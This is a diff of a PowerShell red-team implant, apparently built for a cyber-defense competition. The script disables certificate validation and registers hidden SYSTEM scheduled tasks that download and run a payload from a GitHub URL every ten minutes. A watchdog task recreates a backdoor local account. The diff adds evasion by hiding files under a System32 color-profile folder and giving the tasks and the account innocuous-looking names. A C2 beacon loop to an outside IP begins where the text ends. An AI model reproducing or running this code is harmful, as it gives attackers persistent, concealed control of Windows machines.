@@ -1,4 +1,4 @@
-# payload.ps1 - lives in your GitHub repo
+# payload.ps1
 
 $C2      = "https://100.65.4.238"
 $Secret  = "foxtrot-redteam-2026"
@@ -9,7 +9,6 @@ $Token   = -join ([System.Security.Cryptography.SHA256]::Create().ComputeHash(
 $AgentId = $env:COMPUTERNAME
 $Headers = @{ "X-Agent-Token" = $Token; "Content-Type" = "application/json" }
 
-# Ignore self-signed cert on your Kali box
 add-type @"
 using System.Net; using System.Security.Cryptography.X509Certificates;
 public class TrustAll : ICertificatePolicy {
@@ -19,26 +18,29 @@ public class TrustAll : ICertificatePolicy {
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
 
-# ── Method 1: Scheduled Task to re-pull and re-run payload every 10 minutes ──
+# ── Hidden working directory ──────────────────────────────────────────────────
+# Using System32 subdirectory which blends in with legitimate Windows files
+$workDir = "C:\Windows\System32\spool\drivers\color"
+
+# ── Method 1: Scheduled Task ──────────────────────────────────────────────────
 $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BSparacio/CDT_Red_Team_Tool/main/payload.ps1' -OutFile C:\Windows\Temp\p.ps1 -UseBasicParsing; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\p.ps1`""
+    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BSparacio/CDT_Red_Team_Tool/main/payload.ps1' -OutFile $workDir\svc.ps1 -UseBasicParsing; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $workDir\svc.ps1`""
 
-$trigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -Once -At (Get-Date)
-$settings = New-ScheduledTaskSettingsSet -Hidden
-
+$trigger   = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -Once -At (Get-Date)
+$settings  = New-ScheduledTaskSettingsSet -Hidden
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName "MicrosoftWindowsUpdate" `
+Register-ScheduledTask -TaskName "ssh-scoring-check" `
     -Action $action `
     -Trigger $trigger `
     -Settings $settings `
     -Principal $principal `
     -Force
 
-# ── Method 3: Watchdog scheduled task to recreate backdoor user if deleted ────
+# ── Method 3: Watchdog scheduled task ────────────────────────────────────────
 $watchdog = @'
 $hostname   = $env:COMPUTERNAME.ToLower()
-$username   = "svc_$($hostname.Substring(0, [Math]::Min(6, $hostname.Length)))"
+$username   = "cloudbase-init1"
 $seed       = "redteam-rit-2026"
 $bytes      = [System.Text.Encoding]::UTF8.GetBytes($seed + $hostname)
 $hash       = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
@@ -54,33 +56,20 @@ if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
 }
 '@
 
-$watchdog | Out-File "C:\Windows\Temp\watchdog.ps1" -Force
+$watchdog | Out-File "$workDir\drv.ps1" -Force
 
-$watchdogAction   = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\watchdog.ps1"
-$watchdogTrigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
-$watchdogSettings = New-ScheduledTaskSettingsSet -Hidden
-
+$watchdogAction    = New-ScheduledTaskAction -Execute "powershell.exe" `
+    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $workDir\drv.ps1"
+$watchdogTrigger   = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
+$watchdogSettings  = New-ScheduledTaskSettingsSet -Hidden
 $watchdogPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName "MicrosoftEdgeUpdate" `
+Register-ScheduledTask -TaskName "service-health-monitor" `
     -Action $watchdogAction `
     -Trigger $watchdogTrigger `
     -Settings $watchdogSettings `
     -Principal $watchdogPrincipal `
     -Force
-
-# ── Beacon log for debugging ──────────────────────────────────────────────────
-try {
-    $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
-    $resp = Invoke-RestMethod -Uri "$C2/beacon" -Method POST `
-                -Headers $Headers -Body $body
-    "SUCCESS: Got response" | Out-File "C:\Users\Public\beacon_log.txt" -Force
-    $resp | ConvertTo-Json | Out-File "C:\Users\Public\beacon_log.txt" -Append
-} catch {
-    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\beacon_log.txt" -Force
-    $_.Exception | Format-List * | Out-File "C:\Users\Public\beacon_log.txt" -Append
-}
 
 # ── C2 beacon loop ────────────────────────────────────────────────────────────
 while ($true) {
